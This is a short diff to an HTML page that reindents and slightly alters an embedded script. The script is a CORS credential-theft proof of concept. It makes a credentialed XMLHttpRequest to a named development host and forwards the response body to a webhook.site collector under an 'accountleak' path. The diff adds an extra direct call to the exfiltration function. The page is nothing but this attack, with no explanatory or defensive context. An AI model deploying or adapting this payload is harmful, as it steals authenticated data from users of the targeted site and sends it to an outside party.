@@ -9,16 +9,17 @@
     <h4>Hi User :)</h4>
     
 <script>
-alert('Wow Bro');
-var req = new XMLHttpRequest();
-req.onload = reqListener;
-req.open('get','https://dev01.horizon.paradigmit.com/main.ef2397eaad3da039d8f2.js',true);
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-   location='https://webhook.site/d265932c-a435-4db5-af14-b6043a389d72/accountleak?='+this.responseText;
-};
+    alert('Wow Bro');
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://dev01.horizon.paradigmit.com/main.ef2397eaad3da039d8f2.js',true);
+    req.withCredentials = true;
+    req.send();
+    
+    function reqListener() {
+       location='https://webhook.site/d265932c-a435-4db5-af14-b6043a389d72/accountleak?='+this.responseText;
+    };
+    reqListener();
 </script>
 </body>
 </html>
